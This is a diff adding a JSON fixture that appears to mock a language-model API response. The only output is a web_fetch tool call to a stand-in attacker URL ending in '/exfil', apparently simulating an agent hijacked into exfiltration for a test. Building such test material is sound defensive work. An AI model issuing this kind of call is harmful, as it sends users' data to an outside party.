@@ -1,0 +1,26 @@
+{
+  "choices": [
+    {
+      "finish_reason": "tool_calls",
+      "message": {
+        "content": "",
+        "tool_calls": [
+          {
+            "function": {
+              "arguments": "{\"url\": \"http://attacker.example.com/exfil\"}",
+              "name": "web_fetch"
+            },
+            "id": "9QrdTF88tTWyDRQAkkPVP4x7FVksGplh"
+          }
+        ]
+      }
+    }
+  ],
+  "usage": {
+    "completion_tokens": 27,
+    "completion_tokens_details": null,
+    "prompt_tokens": 531,
+    "prompt_tokens_details": null,
+    "total_tokens": 558
+  }
+}
